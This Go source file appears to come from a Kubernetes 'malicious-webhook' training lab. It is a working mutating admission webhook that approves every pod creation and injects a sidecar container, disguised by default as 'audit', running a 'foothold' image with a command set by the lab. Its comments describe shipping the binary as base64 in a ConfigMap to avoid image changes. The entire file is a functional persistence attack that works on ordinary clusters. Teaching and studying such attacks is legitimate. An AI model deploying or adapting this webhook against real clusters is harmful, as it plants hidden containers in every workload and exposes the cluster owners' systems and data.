// Minimal MutatingAdmissionWebhook server for the malicious-webhook lab.
// Injects a sidecar container into every pod CREATE it sees. Self-contained
// (stdlib only) so it builds to a static binary carried as base64 in a ConfigMap
// - no image change, no external deps. Cert/key read from /tls.
package main

import (
	"crypto/tls"
	"encoding/base64"
	"encoding/json"
	"log"
	"net/http"
	"os"
)

// The sidecar to inject. Image/command come from env so the lab manifest sets
// them (baked foothold image, a command that reads the flag). Kept as a raw map
// so we emit exactly the JSON the API server expects in a JSONPatch.
func sidecar() map[string]any {
	img := envOr("SIDECAR_IMAGE", "k8labs-foothold:1.31")
	cmd := envOr("SIDECAR_CMD", "sleep 3600")
	return map[string]any{
		"name":            envOr("SIDECAR_NAME", "audit"),
		"image":           img,
		"imagePullPolicy": "Never",
		"command":         []string{"sh", "-c", cmd},
	}
}

func envOr(k, d string) string {
	if v := os.Getenv(k); v != "" {
		return v
	}
	return d
}

func handleMutate(w http.ResponseWriter, r *http.Request) {
	var review map[string]any
	if err := json.NewDecoder(r.Body).Decode(&review); err != nil {
		http.Error(w, err.Error(), http.StatusBadRequest)
		return
	}
	req, _ := review["request"].(map[string]any)
	uid, _ := req["uid"].(string)

	// JSONPatch: append our sidecar to the pod's containers list.
	patch := []map[string]any{{"op": "add", "path": "/spec/containers/-", "value": sidecar()}}
	patchBytes, _ := json.Marshal(patch)

	resp := map[string]any{
		"uid":       uid,
		"allowed":   true,
		"patchType": "JSONPatch",
		"patch":     base64.StdEncoding.EncodeToString(patchBytes),
	}
	out := map[string]any{
		"apiVersion": "admission.k8s.io/v1",
		"kind":       "AdmissionReview",
		"response":   resp,
	}
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(out)
}

func main() {
	mux := http.NewServeMux()
	mux.HandleFunc("/mutate", handleMutate)
	mux.HandleFunc("/healthz", func(w http.ResponseWriter, r *http.Request) { w.Write([]byte("ok")) })
	srv := &http.Server{Addr: envOr("ADDR", ":8443"), Handler: mux, TLSConfig: &tls.Config{MinVersion: tls.VersionTLS12}}
	log.Println("webhook listening on :8443")
	log.Fatal(srv.ListenAndServeTLS(envOr("TLS_DIR","/tls")+"/tls.crt", envOr("TLS_DIR","/tls")+"/tls.key"))
}
